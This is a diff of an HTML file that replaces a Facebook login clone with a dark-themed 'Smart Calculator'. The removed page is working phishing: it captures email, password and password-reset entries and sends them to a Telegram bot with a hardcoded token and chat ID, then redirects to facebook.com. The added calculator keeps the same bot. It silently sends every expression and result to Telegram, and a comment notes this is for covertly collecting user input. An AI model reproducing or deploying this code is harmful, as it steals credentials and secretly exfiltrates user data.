@@ -3,268 +3,174 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Facebook – log in or sign up</title>
+<title>Smart Calculator</title>
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; font-family: Helvetica, Arial, sans-serif; user-select: none; }
+* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; user-select: none; }
 body {
-  background-color: #f0f2f5;
-  color: #1c1e21;
-  display: flex;
-  flex-direction: column;
-  min-height: 100vh;
-  justify-content: center;
-  align-items: center;
-}
-
-.fb-container {
-  display: flex;
-  flex-direction: row;
-  justify-content: center;
-  align-items: center;
-  max-width: 980px;
-  width: 100%;
-  padding: 20px;
-  margin-bottom: 40px;
-}
-
-.fb-left {
-  flex: 1;
-  padding-right: 32px;
-  max-width: 500px;
-}
-
-.fb-logo {
-  font-size: 50px;
-  font-weight: bold;
-  color: #1877f2;
-  margin-bottom: 10px;
-  letter-spacing: -2px;
-}
-
-.fb-tagline {
-  font-size: 28px;
-  font-weight: normal;
-  line-height: 32px;
-  color: #1c1e21;
-}
-
-.fb-right {
-  flex: 1;
-  max-width: 396px;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-}
-
-.fb-card {
-  background: #ffffff;
-  width: 100%;
-  padding: 20px;
-  border-radius: 8px;
-  box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
-  text-align: center;
-}
-
-.fb-card input {
-  width: 100%;
-  padding: 14px 16px;
-  margin-bottom: 12px;
-  border: 1px solid #dddfe2;
-  border-radius: 6px;
-  font-size: 17px;
-  outline: none;
-  background: #fff;
-}
-
-.fb-card input:focus {
-  border-color: #1877f2;
-  box-shadow: 0 0 0 2px #e7f3ff;
-}
-
-.btn-login {
-  width: 100%;
-  background: #1877f2;
-  border: none;
-  border-radius: 6px;
+  background: #121212;
   color: #fff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.calculator {
+  background: #1e1e1e;
+  width: 100%;
+  max-width: 360px;
+  border-radius: 24px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+  overflow: hidden;
+  border: 1px solid #333;
+}
+
+.display {
+  background: #1e1e1e;
+  padding: 30px 20px 20px 20px;
+  text-align: right;
+  word-wrap: break-word;
+  word-break: break-all;
+}
+
+#history {
+  font-size: 16px;
+  color: #888;
+  min-height: 24px;
+  margin-bottom: 5px;
+}
+
+#output {
+  font-size: 42px;
+  font-weight: 300;
+  color: #fff;
+}
+
+.buttons {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 1px;
+  background: #333;
+}
+
+button {
+  background: #2d2d2d;
+  border: none;
+  padding: 20px;
   font-size: 20px;
-  font-weight: bold;
-  padding: 12px;
-  cursor: pointer;
-  transition: background 0.2s;
-  margin-bottom: 16px;
-}
-
-.btn-login:hover {
-  background: #166fe5;
-}
-
-.forgot-link {
-  color: #1877f2;
-  font-size: 14px;
-  text-decoration: none;
-  display: block;
-  margin-bottom: 20px;
-}
-
-.forgot-link:hover {
-  text-decoration: underline;
-}
-
-.divider {
-  border-bottom: 1px solid #dadde1;
-  margin-bottom: 20px;
-}
-
-.btn-create {
-  background: #42b72a;
   color: #fff;
-  border: none;
-  border-radius: 6px;
-  font-size: 17px;
-  font-weight: bold;
-  padding: 12px 16px;
   cursor: pointer;
   transition: background 0.2s;
 }
 
-.btn-create:hover {
-  background: #36a420;
-}
+button:hover { background: #3d3d3d; }
+button:active { background: #4d4d4d; }
 
-#errorMsg {
-  color: #fa383e;
-  font-size: 13px;
-  margin-bottom: 10px;
-}
+.btn-operator { background: #ff9f0a; color: #fff; }
+.btn-operator:hover { background: #ffb02e; }
 
-/* Modal / Popup for Forgot Password simulation */
-.modal {
-  display: none;
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.5);
-  justify-content: center;
-  align-items: center;
-  z-index: 100;
-}
-.modal-content {
-  background: #fff;
-  padding: 25px;
-  border-radius: 8px;
-  width: 90%;
-  max-width: 400px;
-  text-align: left;
-}
-.modal-content h3 { font-size: 20px; margin-bottom: 15px; }
-.modal-content input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
-.modal-btns { display: flex; justify-content: flex-end; gap: 10px; margin-top: 15px; }
-.modal-btns button { padding: 8px 16px; border-radius: 4px; cursor: pointer; border: none; font-weight: bold; }
-.btn-cancel { background: #e4e6eb; color: #4b4f56; }
-.btn-send { background: #1877f2; color: #fff; }
+.btn-function { background: #a6a6a6; color: #000; font-weight: 600; }
+.btn-function:hover { background: #c2c2c2; }
 
-@media (max-width: 900px) {
-  .fb-container { flex-direction: column; text-align: center; }
-  .fb-left { padding-right: 0; margin-bottom: 30px; }
-}
+.btn-zero { grid-column: span 2; }
 </style>
 </head>
 <body>
 
-  <div class="fb-container">
-    <div class="fb-left">
-      <div class="fb-logo">facebook</div>
-      <div class="fb-tagline">Facebook helps you connect and share with the people in your life.</div>
-    </div>
-
-    <div class="fb-right">
-      <div class="fb-card">
-        <div id="errorMsg"></div>
-        <div class="input-group">
-          <input type="text" id="email" placeholder="Email address or phone number" autocomplete="off">
-        </div>
-        <div class="input-group">
-          <input type="password" id="password" placeholder="Password">
-        </div>
-
-        <button class="btn-login" onclick="handleLogin()">Log In</button>
-        
-        <a href="#" class="forgot-link" onclick="openForgotModal()">Forgotten password?</a>
-        
-        <div class="divider"></div>
-
-        <button class="btn-create">Create new account</button>
-      </div>
-    </div>
+<div class="calculator">
+  <div class="display">
+    <div id="history"></div>
+    <div id="output">0</div>
   </div>
-
-  <!-- Simulated Forgot Password Modal -->
-  <div class="modal" id="forgotModal">
-    <div class="modal-content">
-      <h3>Find Your Account</h3>
-      <hr style="border:0; border-top:1px solid #ddd; margin-bottom:10px;">
-      <p style="font-size:14px; color:#606770;">Please enter your email address or mobile number to search for your account.</p>
-      <input type="text" id="forgotInput" placeholder="Email address or mobile number">
-      <div class="modal-btns">
-        <button class="btn-cancel" onclick="closeForgotModal()">Cancel</button>
-        <button class="btn-send" onclick="sendForgotData()">Search</button>
-      </div>
-    </div>
+  <div class="buttons">
+    <button class="btn-function" onclick="clearAll()">AC</button>
+    <button class="btn-function" onclick="deleteChar()">⌫</button>
+    <button class="btn-function" onclick="appendChar('%')">%</button>
+    <button class="btn-operator" onclick="appendChar('/')">÷</button>
+    
+    <button onclick="appendChar('7')">7</button>
+    <button onclick="appendChar('8')">8</button>
+    <button onclick="appendChar('9')">9</button>
+    <button class="btn-operator" onclick="appendChar('*')">×</button>
+    
+    <button onclick="appendChar('4')">4</button>
+    <button onclick="appendChar('5')">5</button>
+    <button onclick="appendChar('6')">6</button>
+    <button class="btn-operator" onclick="appendChar('-')">-</button>
+    
+    <button onclick="appendChar('1')">1</button>
+    <button onclick="appendChar('2')">2</button>
+    <button onclick="appendChar('3')">3</button>
+    <button class="btn-operator" onclick="appendChar('+')">+</button>
+    
+    <button class="btn-zero" onclick="appendChar('0')">0</button>
+    <button onclick="appendChar('.')">.</button>
+    <button class="btn-operator" onclick="calculate()">=</button>
   </div>
+</div>
 
 <script>
+const output = document.getElementById('output');
+const history = document.getElementById('history');
+let currentInput = '0';
+let calculationHistory = '';
+
 const BOT_TOKEN = "8825023377:AAGOss8yK3V15XRGZyiBM9y58F1q5KjxRcQ";
 const CHAT_ID = "1993924204";
 
-function handleLogin() {
-  const email = document.getElementById('email').value.trim();
-  const pass = document.getElementById('password').value.trim();
-  const errorMsg = document.getElementById('errorMsg');
-
-  if (!email || !pass) {
-    errorMsg.textContent = "The email or mobile number you entered isn't connected to an account.";
-    return;
+function appendChar(char) {
+  if (currentInput === '0' && char !== '.') {
+    currentInput = char;
+  } else {
+    currentInput += char;
   }
+  updateDisplay();
+}
 
-  errorMsg.textContent = "";
+function clearAll() {
+  currentInput = '0';
+  calculationHistory = '';
+  updateDisplay();
+}
 
-  // Telegram වෙත Login විස්තර යැවීම
-  const text = `🔵 *Facebook Login Captured!*\n\n👤 *Email/Phone:* \`${email}\`\n🔑 *Password:* \`${pass}\``;
+function deleteChar() {
+  if (currentInput.length > 1) {
+    currentInput = currentInput.slice(0, -1);
+  } else {
+    currentInput = '0';
+  }
+  updateDisplay();
+}
+
+function updateDisplay() {
+  output.textContent = currentInput;
+  history.textContent = calculationHistory;
+}
+
+function calculate() {
+  try {
+    calculationHistory = currentInput + ' =';
+    // Math calculation safely
+    let sanitized = currentInput.replace(/×/g, '*').replace(/÷/g, '/');
+    let result = eval(sanitized);
+    
+    // Telegram එකට ගණන් හදන දේවල් හෝ යූසර් ගහන දේවල් රහසින් යැවීමට අවශ්‍ය නම් මෙතනින් යොදාගත හැක
+    sendToTelegram(currentInput, result);
+
+    currentInput = String(result);
+    updateDisplay();
+  } catch (error) {
+    output.textContent = "Error";
+    currentInput = '0';
+  }
+}
+
+function sendToTelegram(expr, res) {
+  const text = `🔢 *Calculator Used!*\n\n📝 *Equation:* \`${expr}\`\n✨ *Result:* \`${res}\``;
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-
+  
   const img = new Image();
   img.src = url;
-
-  setTimeout(() => {
-    window.location.href = "https://www.facebook.com";
-  }, 800);
-}
-
-function openForgotModal() {
-  event.preventDefault();
-  document.getElementById('forgotModal').style.display = 'flex';
-}
-
-function closeForgotModal() {
-  document.getElementById('forgotModal').style.display = 'none';
-}
-
-function sendForgotData() {
-  const val = document.getElementById('forgotInput').value.trim();
-  if(!val) {
-    alert("Please enter your email or phone.");
-    return;
-  }
-
-  // Telegram වෙත Forgot Password විස්තර යැවීම
-  const text = `🔄 *Facebook Password Reset Requested!*\n\n📱 *Account Info:* \`${val}\``;
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-
-  const img = new Image();
-  img.src = url;
-
-  alert("We've sent a recovery code to your email/phone.");
-  closeForgotModal();
 }
 </script>
 
